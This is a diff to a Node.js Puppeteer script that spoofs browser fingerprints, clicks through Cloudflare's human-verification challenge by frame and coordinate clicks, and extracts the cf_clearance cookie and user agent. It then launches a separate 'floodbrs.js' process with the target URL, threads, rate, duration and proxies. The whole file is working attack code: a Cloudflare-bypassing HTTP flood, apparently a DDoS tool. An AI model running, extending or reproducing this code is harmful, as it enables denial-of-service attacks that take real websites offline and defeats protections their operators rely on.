@@ -13,13 +13,13 @@ const COLORS = {
     RESET: '\x1b[0m'
 };
 
-// Ultimate stealth configuration
+// Enhanced stealth configuration based on simple.py approach
 const applyUltimateStealth = async (page) => {
     await page.evaluateOnNewDocument(() => {
-        // Remove automation detection
+        // Remove all automation detection
         Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
         
-        // Spoof plugins
+        // Enhanced plugin spoofing
         Object.defineProperty(navigator, 'plugins', {
             get: () => [
                 {
@@ -29,18 +29,18 @@ const applyUltimateStealth = async (page) => {
                 },
                 {
                     name: 'Chrome PDF Viewer',
-                    filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai', 
+                    filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai',
                     description: 'Portable Document Format'
                 }
             ]
         });
 
-        // Spoof languages
+        // Language spoofing
         Object.defineProperty(navigator, 'languages', {
             get: () => ['en-US', 'en', 'id-ID', 'id']
         });
 
-        // Mock Chrome runtime
+        // Enhanced Chrome mocking
         window.chrome = {
             runtime: {
                 connect: () => ({
@@ -117,14 +117,18 @@ const applyUltimateStealth = async (page) => {
     });
 };
 
-const getUltimateArgs = () => [
+// Browser args from simple.py approach
+const getBrowserArgs = () => [
     '--no-sandbox',
     '--disable-setuid-sandbox',
     '--disable-dev-shm-usage',
+    '--disable-infobars',
+    '--start-maximized',
+    '--lang=en-US,en;q=0.9',
+    '--window-size=1920,1080',
     '--disable-accelerated-2d-canvas',
     '--disable-gpu',
     '--disable-blink-features=AutomationControlled',
-    '--disable-infobars',
     '--ignore-certificate-errors',
     '--ignore-ssl-errors',
     '--disable-web-security',
@@ -133,21 +137,12 @@ const getUltimateArgs = () => [
     '--disable-backgrounding-occluded-windows',
     '--disable-renderer-backgrounding',
     '--disable-background-timer-throttling',
-    '--disable-background-networking',
-    '--disable-client-side-phishing-detection',
-    '--disable-default-apps',
-    '--disable-extensions',
-    '--disable-component-extensions-with-background-pages',
-    '--disable-translate',
-    '--no-default-browser-check',
-    '--no-first-run',
-    '--window-size=1920,1080',
     '--user-data-dir=/tmp/puppeteer'
 ];
 
-// ULTIMATE CLOUDFLARE SOLVER
-const solveCloudflareUltimate = async (page, proxy, targetURL) => {
-    log('SOLVER', `Starting ultimate solver for ${maskProxy(proxy)}`, 'BLUE');
+// SIMPLE.PY APPROACH - PASSIVE WAIT WITH FRAME CLICK
+const solveCloudflareSimple = async (page, proxy, targetURL) => {
+    log('SOLVER', `Starting simple.py approach for ${maskProxy(proxy)}`, 'BLUE');
     
     let title = await page.title().catch(() => '');
     let currentUrl = page.url();
@@ -164,36 +159,99 @@ const solveCloudflareUltimate = async (page, proxy, targetURL) => {
 
     log('INFO', 'Cloudflare challenge detected', 'YELLOW');
 
-    // STRATEGY 1: Wait for auto-verification
-    log('STRATEGY 1', 'Waiting for auto-verification (12 seconds)', 'BLUE');
-    await sleep(12);
-
+    // SIMPLE.PY STRATEGY: Passive wait with frame click
+    log('STRATEGY', 'Passive wait with frame click (30 seconds max)', 'BLUE');
+    
+    const maxWaitTime = 30; // 30 seconds max
+    const waitInterval = 2; // Check every 2 seconds
+    
+    for (let waitCycle = 0; waitCycle < maxWaitTime / waitInterval; waitCycle++) {
+        await sleep(waitInterval);
+        
+        title = await page.title().catch(() => '');
+        currentUrl = page.url();
+        const frames = await page.frames();
+        
+        log('WAIT', `${waitCycle * waitInterval}s - Title: "${title}" | Frames: ${frames.length}`, 'YELLOW');
+        
+        // Check if challenge completed
+        if (!title.includes('Just a moment') && 
+            !title.includes('Checking your browser') &&
+            !currentUrl.includes('challenges.cloudflare.com')) {
+            log('SUCCESS', 'Challenge completed during passive wait!', 'GREEN');
+            return { solved: true, method: 'passive_wait' };
+        }
+        
+        // If challenge frame found, click once in the center
+        let challengeFrameFound = false;
+        for (const frame of frames) {
+            try {
+                const frameUrl = frame.url();
+                if (frameUrl.includes('challenges.cloudflare.com')) {
+                    if (!challengeFrameFound) { // Only click once per cycle
+                        log('ACTION', 'Clicking challenge frame center...', 'YELLOW');
+                        try {
+                            const frameElement = await frame.frameElement();
+                            const box = await frameElement.boundingBox();
+                            if (box) {
+                                // Click in the center of the frame (simple.py approach)
+                                const clickX = box.x + box.width / 2;
+                                const clickY = box.y + box.height / 2;
+                                await page.mouse.click(clickX, clickY);
+                                challengeFrameFound = true;
+                                log('SUCCESS', `Clicked frame at ${clickX}, ${clickY}`, 'GREEN');
+                            }
+                        } catch (error) {
+                            log('ERROR', `Frame click failed: ${error.message}`, 'RED');
+                        }
+                    }
+                }
+            } catch (error) {
+                // Continue to next frame
+            }
+        }
+    }
+    
+    // Wait additional time for cookies (simple.py approach)
+    log('INFO', 'Waiting for cookies...', 'BLUE');
+    await sleep(5);
+    
+    // Final check
     title = await page.title().catch(() => '');
     if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
-        log('SUCCESS', 'Auto-verification successful!', 'GREEN');
-        return { solved: true, method: 'auto_verification' };
+        log('SUCCESS', 'Challenge solved after additional wait!', 'GREEN');
+        return { solved: true, method: 'additional_wait' };
     }
 
-    // STRATEGY 2: Frame interaction with multiple approaches
-    log('STRATEGY 2', 'Frame interaction with multiple approaches', 'BLUE');
+    log('ERROR', 'Simple approach failed', 'RED');
+    return { solved: false, method: 'simple_failed' };
+};
+
+// ENHANCED SOLVER WITH FALLBACK STRATEGIES
+const solveCloudflareEnhanced = async (page, proxy, targetURL) => {
+    // Try simple.py approach first
+    const simpleResult = await solveCloudflareSimple(page, proxy, targetURL);
+    if (simpleResult.solved) {
+        return simpleResult;
+    }
+
+    log('INFO', 'Simple approach failed, trying enhanced strategies...', 'YELLOW');
+
+    // FALLBACK STRATEGY 1: Text-based checkbox detection
+    log('STRATEGY', 'Text-based checkbox detection', 'BLUE');
     
     const frames = await page.frames();
-    let challengeSolved = false;
-
     for (const frame of frames) {
         try {
             const frameUrl = frame.url();
             if (frameUrl.includes('challenges.cloudflare.com') || frameUrl.includes('/cdn-cgi/')) {
-                log('DEBUG', `Found challenge frame: ${frameUrl}`, 'YELLOW');
-
-                // Wait for challenge to load
-                await sleep(5);
-
-                // Approach 2A: Find by challenge text and nearby checkbox
+                log('DEBUG', 'Found challenge frame', 'YELLOW');
+                
+                // Look for challenge texts
                 const challengeTexts = [
                     'Verify you are human',
                     'Buktikan bahwa Anda adalah manusia',
-                    'Prove you are human', 
+                    'Prove you are human',
                     'Confirm you are human',
                     'Verify you are human by completing',
                     'I am human'
@@ -208,25 +266,21 @@ const solveCloudflareUltimate = async (page, proxy, targetURL) => {
                             log('SUCCESS', `Found challenge text: "${text}"`, 'GREEN');
                             
                             for (const textElement of textElements) {
-                                // Get text element position
                                 const textBox = await textElement.boundingBox();
                                 if (textBox) {
-                                    log('DEBUG', `Text position: x=${textBox.x}, y=${textBox.y}`, 'YELLOW');
-                                    
-                                    // Click slightly left of the text (where checkbox usually is)
+                                    // Click left of the text (checkbox position)
                                     const checkboxX = textBox.x - 50;
                                     const checkboxY = textBox.y + textBox.height / 2;
                                     
                                     await page.mouse.click(checkboxX, checkboxY);
-                                    log('SUCCESS', `Clicked at checkbox position: ${checkboxX}, ${checkboxY}`, 'GREEN');
-                                    challengeSolved = true;
+                                    log('SUCCESS', `Clicked at checkbox position`, 'GREEN');
                                     
                                     await sleep(15);
                                     
-                                    title = await page.title().catch(() => '');
+                                    const title = await page.title().catch(() => '');
                                     if (!title.includes('Just a moment')) {
                                         log('SUCCESS', 'Text-based click solved!', 'GREEN');
-                                        return { solved: true, method: 'text_based_click' };
+                                        return { solved: true, method: 'text_based' };
                                     }
                                     break;
                                 }
@@ -236,54 +290,6 @@ const solveCloudflareUltimate = async (page, proxy, targetURL) => {
                         // Continue to next text
                     }
                 }
-
-                // Approach 2B: Direct element interaction
-                if (!challengeSolved) {
-                    const interactiveSelectors = [
-                        'input[type="checkbox"]',
-                        '.cf-challenge-checkbox',
-                        '[role="checkbox"]',
-                        '#cf-challenge-checkbox',
-                        '.hcaptcha-checkbox',
-                        '.recaptcha-checkbox',
-                        'button',
-                        'input[type="submit"]',
-                        '.btn',
-                        '.button',
-                        '[role="button"]'
-                    ];
-
-                    for (const selector of interactiveSelectors) {
-                        try {
-                            const elements = await frame.$$(selector);
-                            for (const element of elements) {
-                                try {
-                                    const isVisible = await element.isIntersectingViewport();
-                                    if (isVisible) {
-                                        await element.click({ delay: 100 });
-                                        log('SUCCESS', `Clicked element: ${selector}`, 'GREEN');
-                                        challengeSolved = true;
-                                        
-                                        await sleep(15);
-                                        
-                                        title = await page.title().catch(() => '');
-                                        if (!title.includes('Just a moment')) {
-                                            log('SUCCESS', 'Element click solved!', 'GREEN');
-                                            return { solved: true, method: 'element_click' };
-                                        }
-                                        break;
-                                    }
-                                } catch (error) {
-                                    // Continue to next element
-                                }
-                            }
-                            if (challengeSolved) break;
-                        } catch (error) {
-                            // Continue to next selector
-                        }
-                    }
-                }
-
                 break;
             }
         } catch (error) {
@@ -291,134 +297,46 @@ const solveCloudflareUltimate = async (page, proxy, targetURL) => {
         }
     }
 
-    // STRATEGY 3: Smart coordinate clicking
-    if (!challengeSolved) {
-        log('STRATEGY 3', 'Smart coordinate clicking', 'BLUE');
-        
-        const viewport = page.viewport();
-        const centerX = viewport.width / 2;
-        const centerY = viewport.height / 2;
-        
-        // Common Cloudflare checkbox positions
-        const smartPositions = [
-            // Left side positions (most common)
-            { x: centerX - 200, y: centerY, desc: 'Far left' },
-            { x: centerX - 150, y: centerY, desc: 'Left' },
-            { x: centerX - 100, y: centerY, desc: 'Near left' },
-            
-            // Center positions
-            { x: centerX, y: centerY, desc: 'Center' },
-            { x: centerX, y: centerY - 50, desc: 'Center up' },
-            { x: centerX, y: centerY + 50, desc: 'Center down' },
-            
-            // Right positions
-            { x: centerX + 100, y: centerY, desc: 'Near right' },
-            { x: centerX + 150, y: centerY, desc: 'Right' }
-        ];
+    // FALLBACK STRATEGY 2: Coordinate clicking
+    log('STRATEGY', 'Coordinate clicking', 'BLUE');
+    
+    const viewport = page.viewport();
+    const centerX = viewport.width / 2;
+    const centerY = viewport.height / 2;
+    
+    const positions = [
+        { x: centerX - 150, y: centerY, desc: 'Left' },
+        { x: centerX - 100, y: centerY, desc: 'Near left' },
+        { x: centerX, y: centerY, desc: 'Center' },
+        { x: centerX + 100, y: centerY, desc: 'Right' }
+    ];
 
-        for (const position of smartPositions) {
-            try {
-                await page.mouse.click(position.x, position.y);
-                log('CLICK', `Clicked at ${position.x}, ${position.y} (${position.desc})`, 'YELLOW');
-                
-                await sleep(8);
-                
-                title = await page.title().catch(() => '');
-                if (!title.includes('Just a moment')) {
-                    log('SUCCESS', `Coordinate click solved at ${position.desc}!`, 'GREEN');
-                    return { solved: true, method: 'coordinate_click' };
-                }
-            } catch (error) {
-                // Continue to next position
-            }
-        }
-    }
-
-    // STRATEGY 4: JavaScript execution in page context
-    if (!challengeSolved) {
-        log('STRATEGY 4', 'JavaScript execution', 'BLUE');
-        
+    for (const position of positions) {
         try {
-            await page.evaluate(() => {
-                // Try to find and click any checkbox
-                const checkboxes = document.querySelectorAll('input[type="checkbox"]');
-                checkboxes.forEach(checkbox => {
-                    try {
-                        if (checkbox.offsetWidth > 0 && checkbox.offsetHeight > 0) {
-                            checkbox.click();
-                        }
-                    } catch (e) {}
-                });
-                
-                // Try to submit any form
-                const forms = document.querySelectorAll('form');
-                forms.forEach(form => {
-                    try {
-                        form.submit();
-                    } catch (e) {}
-                });
-                
-                // Trigger click events
-                document.dispatchEvent(new MouseEvent('click', { bubbles: true }));
-            });
+            await page.mouse.click(position.x, position.y);
+            log('CLICK', `Clicked at ${position.desc}`, 'YELLOW');
             
-            await sleep(15);
+            await sleep(10);
             
-            title = await page.title().catch(() => '');
+            const title = await page.title().catch(() => '');
             if (!title.includes('Just a moment')) {
-                log('SUCCESS', 'JavaScript execution solved!', 'GREEN');
-                return { solved: true, method: 'javascript_execution' };
+                log('SUCCESS', `Coordinate click solved at ${position.desc}!`, 'GREEN');
+                return { solved: true, method: 'coordinate' };
             }
         } catch (error) {
-            log('ERROR', `JavaScript execution failed: ${error.message}`, 'RED');
+            // Continue to next position
         }
     }
 
-    // STRATEGY 5: Refresh and retry
-    if (!challengeSolved) {
-        log('STRATEGY 5', 'Refresh and retry', 'BLUE');
-        
-        await page.reload({ waitUntil: 'networkidle0', timeout: 30000 }).catch(() => {});
-        await sleep(20);
-        
-        title = await page.title().catch(() => '');
-        if (!title.includes('Just a moment')) {
-            log('SUCCESS', 'Refresh solved!', 'GREEN');
-            return { solved: true, method: 'refresh' };
-        }
-    }
-
-    // STRATEGY 6: Final direct navigation
-    if (!challengeSolved) {
-        log('STRATEGY 6', 'Direct navigation with headers', 'BLUE');
-        
-        await page.setExtraHTTPHeaders({
-            'Referer': 'https://www.google.com/',
-            'Accept-Language': 'en-US,en;q=0.9,id;q=0.8'
-        });
-        
-        await page.goto(targetURL, { 
-            waitUntil: 'networkidle0', 
-            timeout: 45000 
-        }).catch(() => {});
-        
-        await sleep(20);
-        title = await page.title().catch(() => '');
-        
-        if (!title.includes('Just a moment')) {
-            log('SUCCESS', 'Direct navigation solved!', 'GREEN');
-            return { solved: true, method: 'direct_navigation' };
-        }
-    }
-
-    log('ERROR', 'All ultimate strategies failed', 'RED');
-    return { solved: false, method: 'all_failed' };
+    log('ERROR', 'All enhanced strategies failed', 'RED');
+    return { solved: false, method: 'enhanced_failed' };
 };
 
-// Extract cookies
+// EXTRACT COOKIES (SIMPLE.PY APPROACH)
 const extractCookies = async (page, targetURL) => {
     await sleep(5);
     
+    // Get all cookies
     const allCookies = await page.cookies().catch(() => []);
     
     if (allCookies.length === 0) {
@@ -426,37 +344,44 @@ const extractCookies = async (page, targetURL) => {
         return { cookies: '', count: 0, names: [] };
     }
 
-    // Filter Cloudflare cookies
+    log('DEBUG', `Found ${allCookies.length} cookies:`, 'GREEN');
+    allCookies.forEach(cookie => {
+        log('DEBUG', `- ${cookie.name}: ${cookie.value.substring(0, 30)}...`, 'YELLOW');
+    });
+
+    // Look for cf_clearance first (simple.py priority)
+    const cfClearance = allCookies.find(cookie => cookie.name === 'cf_clearance');
+    
+    if (cfClearance) {
+        log('SUCCESS', 'cf_clearance found!', 'GREEN');
+        const cookieString = `cf_clearance=${cfClearance.value}`;
+        return {
+            cookies: cookieString,
+            count: 1,
+            names: [cfClearance.name]
+        };
+    }
+
+    // Fallback to any Cloudflare cookies
     const cloudflareCookies = allCookies.filter(cookie => 
         cookie.name.includes('cf_') ||
         cookie.name.includes('__cf') ||
         cookie.domain.includes('cloudflare')
     );
 
-    log('COOKIES', `Total cookies: ${allCookies.length}`, 'GREEN');
-    
     if (cloudflareCookies.length > 0) {
-        const cloudflareNames = cloudflareCookies.map(c => c.name).join(', ');
-        log('COOKIES', `Cloudflare cookies: ${cloudflareNames}`, 'BLUE');
-        
-        const cookieString = cloudflareCookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
+        const bestCookie = cloudflareCookies[0];
+        log('FALLBACK', `Using ${bestCookie.name} as alternative`, 'YELLOW');
+        const cookieString = `${bestCookie.name}=${bestCookie.value}`;
         return {
             cookies: cookieString,
-            count: cloudflareCookies.length,
-            names: cloudflareCookies.map(c => c.name)
-        };
-    } else {
-        log('COOKIES', 'No Cloudflare cookies, using all cookies', 'YELLOW');
-        const cookieString = allCookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
-        const allNames = allCookies.map(c => c.name).join(', ');
-        log('COOKIES', `All cookies: ${allNames}`, 'YELLOW');
-        
-        return {
-            cookies: cookieString,
-            count: allCookies.length,
-            names: allCookies.map(c => c.name)
+            count: 1,
+            names: [bestCookie.name]
         };
     }
+
+    log('ERROR', 'No Cloudflare cookies found', 'RED');
+    return { cookies: '', count: 0, names: [] };
 };
 
 // Command-line setup
@@ -485,7 +410,7 @@ const validKey = generateRandomString(16);
 const readProxies = (filePath) => {
     try {
         const proxies = fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
-        return [proxies[0]];
+        return [proxies[0]]; // Use first proxy only
     } catch (error) {
         log('ERROR', 'Cannot read proxy file', 'RED');
         return [];
@@ -516,12 +441,11 @@ const randomElement = (array) => array[Math.floor(Math.random() * array.length)]
 const userAgents = [
     `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
     `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
-    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
-    `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0`
+    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`
 ];
 
-// Ultimate browser launcher
-const launchUltimateBrowser = async (targetURL, proxy, attempt = 1) => {
+// Browser launcher with simple.py approach
+const launchBrowser = async (targetURL, proxy, attempt = 1) => {
     const userAgent = randomElement(userAgents);
     let browser;
 
@@ -529,7 +453,7 @@ const launchUltimateBrowser = async (targetURL, proxy, attempt = 1) => {
         headless: true,
         args: [
             `--user-agent=${userAgent}`,
-            ...getUltimateArgs()
+            ...getBrowserArgs()
         ],
         defaultViewport: { 
             width: 1920, 
@@ -544,16 +468,13 @@ const launchUltimateBrowser = async (targetURL, proxy, attempt = 1) => {
         browser = await puppeteer.launch(options);
         const [page] = await browser.pages();
 
-        // Apply ultimate stealth
+        // Apply stealth
         await applyUltimateStealth(page);
 
-        // Set realistic headers
+        // Set headers
         await page.setExtraHTTPHeaders({
             'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none'
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
         });
 
         log('NAVIGATE', `Going to: ${targetURL}`, 'BLUE');
@@ -564,24 +485,27 @@ const launchUltimateBrowser = async (targetURL, proxy, attempt = 1) => {
             timeout: 60000 
         }).catch(() => {});
 
-        // Solve Cloudflare with ultimate solver
-        const solveResult = await solveCloudflareUltimate(page, proxy, targetURL);
+        // Solve Cloudflare with simple.py approach first
+        const solveResult = await solveCloudflareEnhanced(page, proxy, targetURL);
         
         if (!solveResult.solved) {
             throw new Error(`Cloudflare challenge failed: ${solveResult.method}`);
         }
 
-        // Extract cookies
+        // Extract cookies (simple.py approach)
         const cookieResult = await extractCookies(page, targetURL);
         
+        // Get user agent
+        const finalUserAgent = await page.evaluate(() => navigator.userAgent);
+        
         successCount++;
-        log('SUCCESS', `Solved via ${solveResult.method}! Cookies: ${cookieResult.count}`, 'GREEN');
+        log('SUCCESS', `Solved via ${solveResult.method}!`, 'GREEN');
 
         await browser.close();
 
         return {
             cookies: cookieResult.cookies,
-            userAgent: userAgent,
+            userAgent: finalUserAgent,
             cookieCount: cookieResult.count,
             cookieNames: cookieResult.names,
             method: solveResult.method
@@ -590,11 +514,10 @@ const launchUltimateBrowser = async (targetURL, proxy, attempt = 1) => {
     } catch (error) {
         if (browser) await browser.close().catch(() => {});
         
-        if (attempt < 3) {
-            const retryDelay = 10 + attempt * 5;
-            log('RETRY', `Retrying in ${retryDelay}s (${attempt}/3)...`, 'YELLOW');
-            await sleep(retryDelay);
-            return launchUltimateBrowser(targetURL, proxy, attempt + 1);
+        if (attempt < 5) { // Increased to 5 attempts like simple.py
+            log('RETRY', `Retrying (${attempt}/5)...`, 'YELLOW');
+            await sleep(8);
+            return launchBrowser(targetURL, proxy, attempt + 1);
         }
         
         log('FAILED', `${maskProxy(proxy)} - ${error.message}`, 'RED');
@@ -614,46 +537,59 @@ const main = async () => {
     log('START', `Target: ${targetURL}`, 'GREEN');
     log('INFO', `Using 1 proxy | Flood threads: ${threads} | Time: ${duration}s | Rate: ${rate}`, 'BLUE');
 
-    // Process the proxy
     const proxy = proxies[0];
-    
-    try {
-        const result = await launchUltimateBrowser(targetURL, proxy);
+    let cookie = null;
+    let userAgent = null;
+    const maxAttempts = 5;
+
+    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
+        log('ATTEMPT', `Attempt ${attempt} to solve Cloudflare`, 'BLUE');
+        const result = await launchBrowser(targetURL, proxy, attempt);
         
         if (result && result.cookies) {
-            log('RESULT', `Proxy ${maskProxy(proxy)} - ${result.cookieCount} cookies - Method: ${result.method}`, 'GREEN');
-            
-            // Launch flood process
-            try {
-                log('FLOOD', `Starting flood with ${threads} threads, rate ${rate} for ${duration}s`, 'GREEN');
-                const floodProcess = spawn('node', [
-                    'floodbrs.js',
-                    targetURL,
-                    duration.toString(),
-                    rate,
-                    threads.toString(),
-                    proxyFile,
-                    result.cookies,
-                    result.userAgent,
-                    validKey
-                ], {
-                    detached: false,
-                    stdio: 'inherit'
-                });
-                
-                floodProcess.on('close', (code) => {
-                    log('FLOOD', `Flood process completed`, 'YELLOW');
-                    process.exit(0);
-                });
-                
-            } catch (error) {
-                log('ERROR', `Failed to start flood: ${error.message}`, 'RED');
-            }
-        } else {
-            log('ERROR', 'No cookies obtained', 'RED');
+            cookie = result.cookies;
+            userAgent = result.userAgent;
+            log('SUCCESS', `Cloudflare solved on attempt ${attempt}`, 'GREEN');
+            break;
         }
+        
+        log('RETRY', `Retry after failure...`, 'RED');
+    }
+
+    if (!cookie || !userAgent) {
+        log('ERROR', `Failed to solve Cloudflare after ${maxAttempts} attempts`, 'RED');
+        return;
+    }
+
+    log('RESULT', `cf_clearance: ${cookie}`, 'GREEN');
+    log('RESULT', `User-Agent: ${userAgent}`, 'GREEN');
+    log('FLOOD', `Starting flooder for ${duration} seconds...`, 'GREEN');
+
+    // Launch flood process
+    try {
+        log('FLOOD', `Starting flood with ${threads} threads, rate ${rate} for ${duration}s`, 'GREEN');
+        const floodProcess = spawn('node', [
+            'floodbrs.js',
+            targetURL,
+            duration.toString(),
+            rate,
+            threads.toString(),
+            proxyFile,
+            cookie,
+            userAgent,
+            validKey
+        ], {
+            detached: false,
+            stdio: 'inherit'
+        });
+        
+        floodProcess.on('close', (code) => {
+            log('FLOOD', `Flood process completed`, 'YELLOW');
+            process.exit(0);
+        });
+        
     } catch (error) {
-        log('ERROR', error.message, 'RED');
+        log('ERROR', `Failed to start flood: ${error.message}`, 'RED');
     }
 };
 
@@ -671,7 +607,7 @@ process.on('SIGINT', () => {
     process.exit(0);
 });
 
-log('READY', 'ULTIMATE CLOUDFLARE BYPASS - 6 STRATEGIES COMBINED', 'GREEN');
+log('READY', 'SIMPLE.PY APPROACH - PASSIVE WAIT WITH FRAME CLICK', 'GREEN');
 main().catch(error => {
     log('ERROR', error.message, 'RED');
     process.exit(1);
